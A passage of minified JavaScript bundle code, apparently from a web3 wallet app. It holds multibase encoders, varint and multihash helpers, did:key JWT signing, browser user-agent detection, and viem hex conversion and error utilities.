                    for (let u = 0; u < i; ++u) {
                        const t = o[e[u]];
                        if (void 0 === t)
                            throw new SyntaxError("Non-".concat(n, " character"));
                        c = c << r | t,
                        a += r,
                        a >= 8 && (a -= 8,
                        s[l++] = 255 & c >> a)
                    }
                    if (a >= r || 255 & c << 8 - a)
                        throw new SyntaxError("Unexpected end of data");
                    return s
                }
                )(e, o, n, t)
            })
        }
          , no = eo({
            prefix: "\0",
            name: "identity",
            encode: e => (e => (new TextDecoder).decode(e))(e),
            decode: e => (e => (new TextEncoder).encode(e))(e)
        });
        var oo = Object.freeze({
            __proto__: null,
            identity: no
        });
        const io = ro({
            prefix: "0",
            name: "base2",
            alphabet: "01",
            bitsPerChar: 1
        });
        var so = Object.freeze({
            __proto__: null,
            base2: io
        });
        const ao = ro({
            prefix: "7",
            name: "base8",
            alphabet: "01234567",
            bitsPerChar: 3
        });
        var co = Object.freeze({
            __proto__: null,
            base8: ao
        });
        const lo = to({
            prefix: "9",
            name: "base10",
            alphabet: "0123456789"
        });
        var uo = Object.freeze({
            __proto__: null,
            base10: lo
        });
        const ho = ro({
            prefix: "f",
            name: "base16",
            alphabet: "0123456789abcdef",
            bitsPerChar: 4
        })
          , fo = ro({
            prefix: "F",
            name: "base16upper",
            alphabet: "0123456789ABCDEF",
            bitsPerChar: 4
        });
        var po = Object.freeze({
            __proto__: null,
            base16: ho,
            base16upper: fo
        });
        const go = ro({
            prefix: "b",
            name: "base32",
            alphabet: "abcdefghijklmnopqrstuvwxyz234567",
            bitsPerChar: 5
        })
          , yo = ro({
            prefix: "B",
            name: "base32upper",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
            bitsPerChar: 5
        })
          , mo = ro({
            prefix: "c",
            name: "base32pad",
            alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
            bitsPerChar: 5
        })
          , bo = ro({
            prefix: "C",
            name: "base32padupper",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
            bitsPerChar: 5
        })
          , vo = ro({
            prefix: "v",
            name: "base32hex",
            alphabet: "0123456789abcdefghijklmnopqrstuv",
            bitsPerChar: 5
        })
          , wo = ro({
            prefix: "V",
            name: "base32hexupper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
            bitsPerChar: 5
        })
          , To = ro({
            prefix: "t",
            name: "base32hexpad",
            alphabet: "0123456789abcdefghijklmnopqrstuv=",
            bitsPerChar: 5
        })
          , Ao = ro({
            prefix: "T",
            name: "base32hexpadupper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
            bitsPerChar: 5
        })
          , Eo = ro({
            prefix: "h",
            name: "base32z",
            alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
            bitsPerChar: 5
        });
        var Po = Object.freeze({
            __proto__: null,
            base32: go,
            base32upper: yo,
            base32pad: mo,
            base32padupper: bo,
            base32hex: vo,
            base32hexupper: wo,
            base32hexpad: To,
            base32hexpadupper: Ao,
            base32z: Eo
        });
        const Co = to({
            prefix: "k",
            name: "base36",
            alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
        })
          , So = to({
            prefix: "K",
            name: "base36upper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        });
        var Io = Object.freeze({
            __proto__: null,
            base36: Co,
            base36upper: So
        });
        const Bo = to({
            name: "base58btc",
            prefix: "z",
            alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        })
          , xo = to({
            name: "base58flickr",
            prefix: "Z",
            alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
        });
        var Oo = Object.freeze({
            __proto__: null,
            base58btc: Bo,
            base58flickr: xo
        });
        const _o = ro({
            prefix: "m",
            name: "base64",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            bitsPerChar: 6
        })
          , Wo = ro({
            prefix: "M",
            name: "base64pad",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            bitsPerChar: 6
        })
          , Ro = ro({
            prefix: "u",
            name: "base64url",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
            bitsPerChar: 6
        })
          , ko = ro({
            prefix: "U",
            name: "base64urlpad",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
            bitsPerChar: 6
        });
        var Mo = Object.freeze({
            __proto__: null,
            base64: _o,
            base64pad: Wo,
            base64url: Ro,
            base64urlpad: ko
        });
        const No = Array.from("\ud83d\ude80\ud83e\ude90\u2604\ud83d\udef0\ud83c\udf0c\ud83c\udf11\ud83c\udf12\ud83c\udf13\ud83c\udf14\ud83c\udf15\ud83c\udf16\ud83c\udf17\ud83c\udf18\ud83c\udf0d\ud83c\udf0f\ud83c\udf0e\ud83d\udc09\u2600\ud83d\udcbb\ud83d\udda5\ud83d\udcbe\ud83d\udcbf\ud83d\ude02\u2764\ud83d\ude0d\ud83e\udd23\ud83d\ude0a\ud83d\ude4f\ud83d\udc95\ud83d\ude2d\ud83d\ude18\ud83d\udc4d\ud83d\ude05\ud83d\udc4f\ud83d\ude01\ud83d\udd25\ud83e\udd70\ud83d\udc94\ud83d\udc96\ud83d\udc99\ud83d\ude22\ud83e\udd14\ud83d\ude06\ud83d\ude44\ud83d\udcaa\ud83d\ude09\u263a\ud83d\udc4c\ud83e\udd17\ud83d\udc9c\ud83d\ude14\ud83d\ude0e\ud83d\ude07\ud83c\udf39\ud83e\udd26\ud83c\udf89\ud83d\udc9e\u270c\u2728\ud83e\udd37\ud83d\ude31\ud83d\ude0c\ud83c\udf38\ud83d\ude4c\ud83d\ude0b\ud83d\udc97\ud83d\udc9a\ud83d\ude0f\ud83d\udc9b\ud83d\ude42\ud83d\udc93\ud83e\udd29\ud83d\ude04\ud83d\ude00\ud83d\udda4\ud83d\ude03\ud83d\udcaf\ud83d\ude48\ud83d\udc47\ud83c\udfb6\ud83d\ude12\ud83e\udd2d\u2763\ud83d\ude1c\ud83d\udc8b\ud83d\udc40\ud83d\ude2a\ud83d\ude11\ud83d\udca5\ud83d\ude4b\ud83d\ude1e\ud83d\ude29\ud83d\ude21\ud83e\udd2a\ud83d\udc4a\ud83e\udd73\ud83d\ude25\ud83e\udd24\ud83d\udc49\ud83d\udc83\ud83d\ude33\u270b\ud83d\ude1a\ud83d\ude1d\ud83d\ude34\ud83c\udf1f\ud83d\ude2c\ud83d\ude43\ud83c\udf40\ud83c\udf37\ud83d\ude3b\ud83d\ude13\u2b50\u2705\ud83e\udd7a\ud83c\udf08\ud83d\ude08\ud83e\udd18\ud83d\udca6\u2714\ud83d\ude23\ud83c\udfc3\ud83d\udc90\u2639\ud83c\udf8a\ud83d\udc98\ud83d\ude20\u261d\ud83d\ude15\ud83c\udf3a\ud83c\udf82\ud83c\udf3b\ud83d\ude10\ud83d\udd95\ud83d\udc9d\ud83d\ude4a\ud83d\ude39\ud83d\udde3\ud83d\udcab\ud83d\udc80\ud83d\udc51\ud83c\udfb5\ud83e\udd1e\ud83d\ude1b\ud83d\udd34\ud83d\ude24\ud83c\udf3c\ud83d\ude2b\u26bd\ud83e\udd19\u2615\ud83c\udfc6\ud83e\udd2b\ud83d\udc48\ud83d\ude2e\ud83d\ude46\ud83c\udf7b\ud83c\udf43\ud83d\udc36\ud83d\udc81\ud83d\ude32\ud83c\udf3f\ud83e\udde1\ud83c\udf81\u26a1\ud83c\udf1e\ud83c\udf88\u274c\u270a\ud83d\udc4b\ud83d\ude30\ud83e\udd28\ud83d\ude36\ud83e\udd1d\ud83d\udeb6\ud83d\udcb0\ud83c\udf53\ud83d\udca2\ud83e\udd1f\ud83d\ude41\ud83d\udea8\ud83d\udca8\ud83e\udd2c\u2708\ud83c\udf80\ud83c\udf7a\ud83e\udd13\ud83d\ude19\ud83d\udc9f\ud83c\udf31\ud83d\ude16\ud83d\udc76\ud83e\udd74\u25b6\u27a1\u2753\ud83d\udc8e\ud83d\udcb8\u2b07\ud83d\ude28\ud83c\udf1a\ud83e\udd8b\ud83d\ude37\ud83d\udd7a\u26a0\ud83d\ude45\ud83d\ude1f\ud83d\ude35\ud83d\udc4e\ud83e\udd32\ud83e\udd20\ud83e\udd27\ud83d\udccc\ud83d\udd35\ud83d\udc85\ud83e\uddd0\ud83d\udc3e\ud83c\udf52\ud83d\ude17\ud83e\udd11\ud83c\udf0a\ud83e\udd2f\ud83d\udc37\u260e\ud83d\udca7\ud83d\ude2f\ud83d\udc86\ud83d\udc46\ud83c\udfa4\ud83d\ude47\ud83c\udf51\u2744\ud83c\udf34\ud83d\udca3\ud83d\udc38\ud83d\udc8c\ud83d\udccd\ud83e\udd40\ud83e\udd22\ud83d\udc45\ud83d\udca1\ud83d\udca9\ud83d\udc50\ud83d\udcf8\ud83d\udc7b\ud83e\udd10\ud83e\udd2e\ud83c\udfbc\ud83e\udd75\ud83d\udea9\ud83c\udf4e\ud83c\udf4a\ud83d\udc7c\ud83d\udc8d\ud83d\udce3\ud83e\udd42")
          , Fo = No.reduce(( (e, t, r) => (e[r] = t,
        e)), [])
          , Uo = No.reduce(( (e, t, r) => (e[t.codePointAt(0)] = r,
        e)), []);
        const Do = eo({
            prefix: "\ud83d\ude80",
            name: "base256emoji",
            encode: function(e) {
                return e.reduce(( (e, t) => e += Fo[t]), "")
            },
            decode: function(e) {
                const t = [];
                for (const r of e) {
                    const e = Uo[r.codePointAt(0)];
                    if (void 0 === e)
                        throw new Error("Non-base256emoji character: ".concat(r));
                    t.push(e)
                }
                return new Uint8Array(t)
            }
        });
        var Lo = Object.freeze({
            __proto__: null,
            base256emoji: Do
        })
          , jo = function e(t, r, n) {
            r = r || [];
            for (var o = n = n || 0; t >= Ho; )
                r[n++] = 255 & t | zo,
                t /= 128;
            for (; t & Vo; )
                r[n++] = 255 & t | zo,
                t >>>= 7;
            return r[n] = 0 | t,
            e.bytes = n - o + 1,
            r
        }
          , zo = 128
          , Vo = -128
          , Ho = Math.pow(2, 31);
        var qo = function e(t, r) {
            var n, o = 0, i = (r = r || 0,
            0), s = r, a = t.length;
            do {
                if (s >= a)
                    throw e.bytes = 0,
                    new RangeError("Could not decode varint");
                n = t[s++],
                o += i < 28 ? (n & $o) << i : (n & $o) * Math.pow(2, i),
                i += 7
            } while (n >= Go);
            return e.bytes = s - r,
            o
        }
          , Go = 128
          , $o = 127;
        var Ko = Math.pow(2, 7)
          , Zo = Math.pow(2, 14)
          , Yo = Math.pow(2, 21)
          , Jo = Math.pow(2, 28)
          , Xo = Math.pow(2, 35)
          , Qo = Math.pow(2, 42)
          , ei = Math.pow(2, 49)
          , ti = Math.pow(2, 56)
          , ri = Math.pow(2, 63)
          , ni = {
            encode: jo,
            decode: qo,
            encodingLength: function(e) {
                return e < Ko ? 1 : e < Zo ? 2 : e < Yo ? 3 : e < Jo ? 4 : e < Xo ? 5 : e < Qo ? 6 : e < ei ? 7 : e < ti ? 8 : e < ri ? 9 : 10
            }
        }
          , oi = ni;
        const ii = function(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
            return oi.encode(e, t, r),
            t
        }
          , si = e => oi.encodingLength(e)
          , ai = (e, t) => {
            const r = t.byteLength
              , n = si(e)
              , o = n + si(r)
              , i = new Uint8Array(o + r);
            return ii(e, i, 0),
            ii(r, i, n),
            i.set(t, o),
            new ci(e,r,t,i)
        }
        ;
        class ci {
            constructor(e, t, r, n) {
                this.code = e,
                this.size = t,
                this.digest = r,
                this.bytes = n
            }
        }
        const li = e => {
            let {name: t, code: r, encode: n} = e;
            return new ui(t,r,n)
        }
        ;
        class ui {
            constructor(e, t, r) {
                this.name = e,
                this.code = t,
                this.encode = r
            }
            digest(e) {
                if (e instanceof Uint8Array) {
                    const t = this.encode(e);
                    return t instanceof Uint8Array ? ai(this.code, t) : t.then((e => ai(this.code, e)))
                }
                throw Error("Unknown type, must be binary type")
            }
        }
        const di = e => async t => new Uint8Array(await crypto.subtle.digest(e, t))
          , hi = li({
            name: "sha2-256",
            code: 18,
            encode: di("SHA-256")
        })
          , fi = li({
            name: "sha2-512",
            code: 19,
            encode: di("SHA-512")
        });
        var pi = Object.freeze({
            __proto__: null,
            sha256: hi,
            sha512: fi
        });
        const gi = Kn
          , yi = {
            code: 0,
            name: "identity",
            encode: gi,
            digest: e => ai(0, gi(e))
        };
        var mi = Object.freeze({
            __proto__: null,
            identity: yi
        });
        new TextEncoder,
        new TextDecoder;
        const bi = (0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)({}, oo), so), co), uo), po), Po), Io), Oo), Mo), Lo);
        function vi(e, t, r, n) {
            return {
                name: e,
                prefix: t,
                encoder: {
                    name: e,
                    prefix: t,
                    encode: r
                },
                decoder: {
                    decode: n
                }
            }
        }
        (0,
        k.A)((0,
        k.A)({}, pi), mi);
        const wi = vi("utf8", "u", (e => "u" + new TextDecoder("utf8").decode(e)), (e => (new TextEncoder).encode(e.substring(1))))
          , Ti = vi("ascii", "a", (e => {
            let t = "a";
            for (let r = 0; r < e.length; r++)
                t += String.fromCharCode(e[r]);
            return t
        }
        ), (e => {
            const t = Hn((e = e.substring(1)).length);
            for (let r = 0; r < e.length; r++)
                t[r] = e.charCodeAt(r);
            return t
        }
        ))
          , Ai = (0,
        k.A)({
            utf8: wi,
            "utf-8": wi,
            hex: bi.base16,
            latin1: Ti,
            ascii: Ti,
            binary: Ti
        }, bi);
        function Ei(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "utf8";
            const r = Ai[t];
            if (!r)
                throw new Error('Unsupported encoding "'.concat(t, '"'));
            return "utf8" !== t && "utf-8" !== t || null == globalThis.Buffer || null == globalThis.Buffer.from ? r.encoder.encode(e).substring(1) : globalThis.Buffer.from(e.buffer, e.byteOffset, e.byteLength).toString("utf8")
        }
        function Pi(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "utf8";
            const r = Ai[t];
            if (!r)
                throw new Error('Unsupported encoding "'.concat(t, '"'));
            return "utf8" !== t && "utf-8" !== t || null == globalThis.Buffer || null == globalThis.Buffer.from ? r.decoder.decode("".concat(r.prefix).concat(e)) : Vn(globalThis.Buffer.from(e, "utf-8"))
        }
        function Ci(e) {
            return nt(Ei(Pi(e, Fn), Un))
        }
        function Si(e) {
            return Ei(Pi(ot(e), Un), Fn)
        }
        function Ii(e) {
            const t = "z" + Ei(qn([Pi("K36", zn), e]), zn);
            return [Ln, jn, t].join(":")
        }
        function Bi(e) {
            return Ei(e, Fn)
        }
        function xi(e) {
            const t = e.split(Nn)
              , r = Ci(t[0])
              , n = Ci(t[1])
              , o = function(e) {
                return Pi(e, Fn)
            }(t[2]);
            return {
                header: r,
                payload: n,
                signature: o,
                data: Pi(t.slice(0, 2).join(Nn), Dn)
            }
        }
        function Oi() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ar(32);
            const t = kn.getPublicKey(e);
            return {
                secretKey: qn([e, t]),
                publicKey: t
            }
        }
        async function _i(e, t, r, n) {
            let o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : (0,
            Be.fromMiliseconds)(Date.now());
            const i = {
                alg: Mn,
                typ: "JWT"
            }
              , s = {
                iss: Ii(n.publicKey),
                sub: e,
                aud: t,
                iat: o,
                exp: o + r
            }
              , a = function(e) {
                return Pi([Si(e.header), Si(e.payload)].join(Nn), Dn)
            }({
                header: i,
                payload: s
            });
            return function(e) {
                return [Si(e.header), Si(e.payload), Bi(e.signature)].join(Nn)
            }({
                header: i,
                payload: s,
                signature: kn.sign(a, n.secretKey.slice(0, 32))
            })
        }
        var Wi = function(e, t, r) {
            if (r || 2 === arguments.length)
                for (var n, o = 0, i = t.length; o < i; o++)
                    !n && o in t || (n || (n = Array.prototype.slice.call(t, 0, o)),
                    n[o] = t[o]);
            return e.concat(n || Array.prototype.slice.call(t))
        }
          , Ri = function(e, t, r) {
            this.name = e,
            this.version = t,
            this.os = r,
            this.type = "browser"
        }
          , ki = function(e) {
            this.version = e,
            this.type = "node",
            this.name = "node",
            this.os = process.platform
        }
          , Mi = function(e, t, r, n) {
            this.name = e,
            this.version = t,
            this.os = r,
            this.bot = n,
            this.type = "bot-device"
        }
          , Ni = function() {
            this.type = "bot",
            this.bot = !0,
            this.name = "bot",
            this.version = null,
            this.os = null
        }
          , Fi = function() {
            this.type = "react-native",
            this.name = "react-native",
            this.version = null,
            this.os = null
        }
          , Ui = /(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/
          , Di = [["aol", /AOLShield\/([0-9\._]+)/], ["edge", /Edge\/([0-9\._]+)/], ["edge-ios", /EdgiOS\/([0-9\._]+)/], ["yandexbrowser", /YaBrowser\/([0-9\._]+)/], ["kakaotalk", /KAKAOTALK\s([0-9\.]+)/], ["samsung", /SamsungBrowser\/([0-9\.]+)/], ["silk", /\bSilk\/([0-9._-]+)\b/], ["miui", /MiuiBrowser\/([0-9\.]+)$/], ["beaker", /BeakerBrowser\/([0-9\.]+)/], ["edge-chromium", /EdgA?\/([0-9\.]+)/], ["chromium-webview", /(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/], ["chrome", /(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/], ["phantomjs", /PhantomJS\/([0-9\.]+)(:?\s|$)/], ["crios", /CriOS\/([0-9\.]+)(:?\s|$)/], ["firefox", /Firefox\/([0-9\.]+)(?:\s|$)/], ["fxios", /FxiOS\/([0-9\.]+)/], ["opera-mini", /Opera Mini.*Version\/([0-9\.]+)/], ["opera", /Opera\/([0-9\.]+)(?:\s|$)/], ["opera", /OPR\/([0-9\.]+)(:?\s|$)/], ["pie", /^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/], ["pie", /^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/], ["netfront", /^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/], ["ie", /Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/], ["ie", /MSIE\s([0-9\.]+);.*Trident\/[4-7].0/], ["ie", /MSIE\s(7\.0)/], ["bb10", /BB10;\sTouch.*Version\/([0-9\.]+)/], ["android", /Android\s([0-9\.]+)/], ["ios", /Version\/([0-9\._]+).*Mobile.*Safari.*/], ["safari", /Version\/([0-9\._]+).*Safari/], ["facebook", /FB[AS]V\/([0-9\.]+)/], ["instagram", /Instagram\s([0-9\.]+)/], ["ios-webview", /AppleWebKit\/([0-9\.]+).*Mobile/], ["ios-webview", /AppleWebKit\/([0-9\.]+).*Gecko\)$/], ["curl", /^curl\/([0-9\.]+)$/], ["searchbot", /alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/]]
          , Li = [["iOS", /iP(hone|od|ad)/], ["Android OS", /Android/], ["BlackBerry OS", /BlackBerry|BB10/], ["Windows Mobile", /IEMobile/], ["Amazon OS", /Kindle/], ["Windows 3.11", /Win16/], ["Windows 95", /(Windows 95)|(Win95)|(Windows_95)/], ["Windows 98", /(Windows 98)|(Win98)/], ["Windows 2000", /(Windows NT 5.0)|(Windows 2000)/], ["Windows XP", /(Windows NT 5.1)|(Windows XP)/], ["Windows Server 2003", /(Windows NT 5.2)/], ["Windows Vista", /(Windows NT 6.0)/], ["Windows 7", /(Windows NT 6.1)/], ["Windows 8", /(Windows NT 6.2)/], ["Windows 8.1", /(Windows NT 6.3)/], ["Windows 10", /(Windows NT 10.0)/], ["Windows ME", /Windows ME/], ["Windows CE", /Windows CE|WinCE|Microsoft Pocket Internet Explorer/], ["Open BSD", /OpenBSD/], ["Sun OS", /SunOS/], ["Chrome OS", /CrOS/], ["Linux", /(Linux)|(X11)/], ["Mac OS", /(Mac_PowerPC)|(Macintosh)/], ["QNX", /QNX/], ["BeOS", /BeOS/], ["OS/2", /OS\/2/]];
        function ji(e) {
            return e ? Vi(e) : "undefined" === typeof document && "undefined" !== typeof navigator && "ReactNative" === navigator.product ? new Fi : "undefined" !== typeof navigator ? Vi(navigator.userAgent) : "undefined" !== typeof process && process.version ? new ki(process.version.slice(1)) : null
        }
        function zi(e) {
            return "" !== e && Di.reduce((function(t, r) {
                var n = r[0]
                  , o = r[1];
                if (t)
                    return t;
                var i = o.exec(e);
                return !!i && [n, i]
            }
            ), !1)
        }
        function Vi(e) {
            var t = zi(e);
            if (!t)
                return null;
            var r = t[0]
              , n = t[1];
            if ("searchbot" === r)
                return new Ni;
            var o = n[1] && n[1].split(".").join("_").split("_").slice(0, 3);
            o ? o.length < 3 && (o = Wi(Wi([], o, !0), function(e) {
                for (var t = [], r = 0; r < e; r++)
                    t.push("0");
                return t
            }(3 - o.length), !0)) : o = [];
            var i = o.join(".")
              , s = function(e) {
                for (var t = 0, r = Li.length; t < r; t++) {
                    var n = Li[t]
                      , o = n[0];
                    if (n[1].exec(e))
                        return o
                }
                return null
            }(e)
              , a = Ui.exec(e);
            return a && a[1] ? new Mi(r,i,s,a[1]) : new Ri(r,i,s)
        }
        var Hi = r(33)
          , qi = r(9332);
        const Gi = "2.30.6";
        let $i = {
            getDocsUrl: e => {
                let {docsBaseUrl: t, docsPath: r="", docsSlug: n} = e;
                return r ? "".concat(null !== t && void 0 !== t ? t : "https://viem.sh").concat(r).concat(n ? "#".concat(n) : "") : void 0
            }
            ,
            version: "viem@".concat(Gi)
        };
        class Ki extends Error {
            constructor(e) {
                var t, r, n;
                let o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const i = o.cause instanceof Ki ? o.cause.details : null !== (s = o.cause) && void 0 !== s && s.message ? o.cause.message : o.details;
                var s;
                const a = o.cause instanceof Ki && o.cause.docsPath || o.docsPath
                  , c = null === (t = (r = $i).getDocsUrl) || void 0 === t ? void 0 : t.call(r, (0,
                k.A)((0,
                k.A)({}, o), {}, {
                    docsPath: a
                }));
                super([e || "An error occurred.", "", ...o.metaMessages ? [...o.metaMessages, ""] : [], ...c ? ["Docs: ".concat(c)] : [], ...i ? ["Details: ".concat(i)] : [], ...$i.version ? ["Version: ".concat($i.version)] : []].join("\n"), o.cause ? {
                    cause: o.cause
                } : void 0),
                Object.defineProperty(this, "details", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: void 0
                }),
                Object.defineProperty(this, "docsPath", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: void 0
                }),
                Object.defineProperty(this, "metaMessages", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: void 0
                }),
                Object.defineProperty(this, "shortMessage", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: void 0
                }),
                Object.defineProperty(this, "version", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: void 0
                }),
                Object.defineProperty(this, "name", {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: "BaseError"
                }),
                this.details = i,
                this.docsPath = a,
                this.metaMessages = o.metaMessages,
                this.name = null !== (n = o.name) && void 0 !== n ? n : this.name,
                this.shortMessage = e,
                this.version = Gi
            }
            walk(e) {
                return Zi(this, e)
            }
        }
        function Zi(e, t) {
            return null !== t && void 0 !== t && t(e) ? e : e && "object" === typeof e && "cause"in e && void 0 !== e.cause ? Zi(e.cause, t) : t ? null : e
        }
        function Yi(e) {
            let {strict: t=!0} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return !!e && ("string" === typeof e && (t ? /^0x[0-9a-fA-F]*$/.test(e) : e.startsWith("0x")))
        }
        class Ji extends Ki {
            constructor(e) {
                let {size: t, targetSize: r, type: n} = e;
                super("".concat(n.charAt(0).toUpperCase()).concat(n.slice(1).toLowerCase(), " size (").concat(t, ") exceeds padding size (").concat(r, ")."), {
                    name: "SizeExceedsPaddingSizeError"
                })
            }
        }
        function Xi(e) {
            let {dir: t, size: r=32} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return "string" === typeof e ? function(e) {
                let {dir: t, size: r=32} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (null === r)
                    return e;
                const n = e.replace("0x", "");
                if (n.length > 2 * r)
                    throw new Ji({
                        size: Math.ceil(n.length / 2),
                        targetSize: r,
                        type: "hex"
                    });
                return "0x".concat(n["right" === t ? "padEnd" : "padStart"](2 * r, "0"))
            }(e, {
                dir: t,
                size: r
            }) : function(e) {
                let {dir: t, size: r=32} = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (null === r)
                    return e;
                if (e.length > r)
                    throw new Ji({
                        size: e.length,
                        targetSize: r,
                        type: "bytes"
                    });
                const n = new Uint8Array(r);
                for (let o = 0; o < r; o++) {
                    const i = "right" === t;
                    n[i ? o : r - o - 1] = e[i ? o : e.length - o - 1]
                }
                return n
            }(e, {
                dir: t,
                size: r
            })
        }
        class Qi extends Ki {
            constructor(e) {
                let {max: t, min: r, signed: n, size: o, value: i} = e;
                super('Number "'.concat(i, '" is not in safe ').concat(o ? "".concat(8 * o, "-bit ").concat(n ? "signed" : "unsigned", " ") : "", "integer range ").concat(t ? "(".concat(r, " to ").concat(t, ")") : "(above ".concat(r, ")")), {
                    name: "IntegerOutOfRangeError"
                })
            }
        }
        class es extends Ki {
            constructor(e) {
                let {givenSize: t, maxSize: r} = e;
                super("Size cannot exceed ".concat(r, " bytes. Given size: ").concat(t, " bytes."), {
                    name: "SizeOverflowError"
                })
            }
        }
        function ts(e) {
            return Yi(e, {
                strict: !1
            }) ? Math.ceil((e.length - 2) / 2) : e.length
        }
        function rs(e, t) {
            let {size: r} = t;
            if (ts(e) > r)
                throw new es({
                    givenSize: ts(e),
                    maxSize: r
                })
        }
        function ns(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            const {signed: r} = t;
            t.size && rs(e, {
                size: t.size
            });
            const n = BigInt(e);
            if (!r)
                return n;
            const o = (e.length - 2) / 2;
            return n <= (1n << 8n * BigInt(o) - 1n) - 1n ? n : n - BigInt("0x".concat("f".padStart(2 * o, "f"))) - 1n
        }
        function os(e) {
            return Number(ns(e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}))
        }
        const is = Array.from({
            length: 256
        }, ( (e, t) => t.toString(16).padStart(2, "0")));
        function ss(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return "number" === typeof e || "bigint" === typeof e ? cs(e, t) : "string" === typeof e ? function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const r = ls.encode(e);
                return as(r, t)
            }(e, t) : "boolean" === typeof e ? function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const r = "0x".concat(Number(e));
                if ("number" === typeof t.size)
                    return rs(r, {
                        size: t.size
                    }),
                    Xi(r, {
                        size: t.size
                    });
                return r
            }(e, t) : as(e, t)
        }
        function as(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
              , r = "";
            for (let o = 0; o < e.length; o++)
                r += is[e[o]];
            const n = "0x".concat(r);
            return "number" === typeof t.size ? (rs(n, {
                size: t.size
            }),
            Xi(n, {
                dir: "right",
                size: t.size
            })) : n
        }
        function cs(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            const {signed: r, size: n} = t
              , o = BigInt(e);
            let i;
            n ? i = r ? (1n << 8n * BigInt(n) - 1n) - 1n : 2n ** (8n * BigInt(n)) - 1n : "number" === typeof e && (i = BigInt(Number.MAX_SAFE_INTEGER));
            const s = "bigint" === typeof i && r ? -i - 1n : 0;
            if (i && o > i || o < s) {
                const t = "bigint" === typeof e ? "n" : "";
                throw new Qi({
                    max: i ? "".concat(i).concat(t) : void 0,
                    min: "".concat(s).concat(t),
                    signed: r,
                    size: n,
                    value: "".concat(e).concat(t)
                })
            }
            const a = "0x".concat((r && o < 0 ? (1n << BigInt(8 * n)) + BigInt(o) : o).toString(16));
            return n ? Xi(a, {
                size: n
            }) : a
        }
        const ls = new TextEncoder;
        const us = new TextEncoder;
        function ds(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return "number" === typeof e || "bigint" === typeof e ? function(e, t) {
                const r = cs(e, t);
                return ps(r)
            }(e, t) : "boolean" === typeof e ? function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const r = new Uint8Array(1);
                if (r[0] = Number(e),
                "number" === typeof t.size)
                    return rs(r, {
                        size: t.size
                    }),
                    Xi(r, {
                        size: t.size
                    });
                return r
            }(e, t) : Yi(e) ? ps(e, t) : gs(e, t)
        }
        const hs = {
            zero: 48,
            nine: 57,
            A: 65,
            F: 70,
            a: 97,
            f: 102
        };
        function fs(e) {
            return e >= hs.zero && e <= hs.nine ? e - hs.zero : e >= hs.A && e <= hs.F ? e - (hs.A - 10) : e >= hs.a && e <= hs.f ? e - (hs.a - 10) : void 0
        }
        function ps(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
              , r = e;
            t.size && (rs(r, {
                size: t.size
            }),
            r = Xi(r, {
                dir: "right",
                size: t.size
            }));
            let n = r.slice(2);
